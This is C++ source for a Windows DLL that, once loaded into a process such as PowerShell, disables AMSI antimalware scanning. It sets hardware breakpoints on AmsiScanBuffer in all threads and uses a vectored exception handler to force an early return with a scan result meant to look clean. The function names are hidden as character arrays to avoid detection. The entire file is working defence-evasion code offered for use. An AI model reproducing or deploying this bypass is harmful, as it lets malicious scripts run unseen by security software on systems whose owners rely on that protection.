// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

constexpr DWORD64 AMSI_RESULT_CLEAN = 0x80070057;

std::vector <DWORD> GetAllProcThreads(DWORD pid)
{
    DWORD result = 0;
    std::vector<DWORD> allThreadsOfTargetProc;
    THREADENTRY32 threadEntry = { 0 };
    threadEntry.dwSize = sizeof(THREADENTRY32);

    HANDLE snapshotHandle = INVALID_HANDLE_VALUE;
    snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
    if (snapshotHandle == INVALID_HANDLE_VALUE)
    {
        return allThreadsOfTargetProc;
    }

    result = Thread32First(snapshotHandle, &threadEntry);
    if (result)
    {
        if (threadEntry.th32OwnerProcessID == pid)
        {
            DWORD threadId = threadEntry.th32ThreadID;
            allThreadsOfTargetProc.push_back(threadId);
        }
        while (Thread32Next(snapshotHandle, &threadEntry))
        {
            if (threadEntry.th32OwnerProcessID == pid)
            {
                DWORD threadId = threadEntry.th32ThreadID;
                allThreadsOfTargetProc.push_back(threadId);
            }
        }
    }
    else
    {
    }

    CloseHandle(snapshotHandle);
    return allThreadsOfTargetProc;
}

BOOL SetHardwareBreakpointOnAllProcThreads(PVOID breakpointAddress)
{

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    std::vector<DWORD> threads = GetAllProcThreads(GetCurrentProcessId());
    if (threads.size() > 0)
    {
        for (INT i = 0; i < threads.size(); i++)
        {
            HANDLE currentThread = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_QUERY_INFORMATION, TRUE, threads[i]);
            DWORD status = GetThreadContext(currentThread, &ctx);

            ctx.Dr0 = (UINT64)breakpointAddress;
            ctx.Dr7 |= (1 << 0);
            ctx.Dr7 &= ~(1 << 16);
            ctx.Dr7 &= ~(1 << 17);
            ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

            if (!SetThreadContext(currentThread, &ctx)) {
                return false;
            }
            CloseHandle(currentThread);
        }

        return true;
    }


    return false;
}

LONG VehAmsiScanBuffer(_EXCEPTION_POINTERS* ExceptionInfo)
{
    //Only handle our EXCEPTION_SINGLE_STEP triggered by hardware breakpoint
    
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP)
    {
        //MessageBoxA(NULL, "VEH called!", "ERROR", NULL);

        //AmsiScanBuffer hardware breakpoint will trigger at the first ASM instruction when the function is called.
        DWORD64 retAddr = *(PDWORD64)ExceptionInfo->ContextRecord->Rsp;  // *Rsp is the RETURN ADDRESS 
        ExceptionInfo->ContextRecord->Rip = retAddr;                     // Set Rip to point to the return address (make it exit the function) 
        ExceptionInfo->ContextRecord->Rax = AMSI_RESULT_CLEAN;           // Set Rax (function return address) to AMSI_RESULT_CLEAN
        //Resume thread execution with the updated registers
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    //Return EXCEPTION_CONTINUE_SEARCH for any exceptions raised by powershell internally
    return EXCEPTION_CONTINUE_SEARCH;
}

void InstallVeh()
{
    WCHAR amsiDll[] = { 'a','m','s','i','.','d','l','l','\x00' };
    HMODULE amsi = GetModuleHandleW(amsiDll);
    if (!amsi)
    {
        MessageBoxA(NULL, "GetModuleHandleW failed!", "ERROR", NULL);
        return;
    }

    CHAR amsiScanBuffer[] = { 'A','m','s','i','S','c','a','n','B','u','f','f','e','r','\x00' };
    PVOID funcAddr = GetProcAddress(amsi, amsiScanBuffer);
    if (!funcAddr)
    {
        MessageBoxA(NULL, "GetProcAddress failed!", "ERROR", NULL);
        return;
    }

    PVOID veh = AddVectoredExceptionHandler(1, &VehAmsiScanBuffer);
    if (!veh)
    {
        MessageBoxA(NULL, "Add VEH failed!", "ERROR", NULL);
        return;
    }

    DWORD status = SetHardwareBreakpointOnAllProcThreads(funcAddr);
    if (!status)
    {
        MessageBoxA(NULL, "Add H BP failed!", "ERROR", NULL);
        return;
    }
    MessageBoxA(NULL, "VEH installed!", "ERROR", NULL);

}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        InstallVeh();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

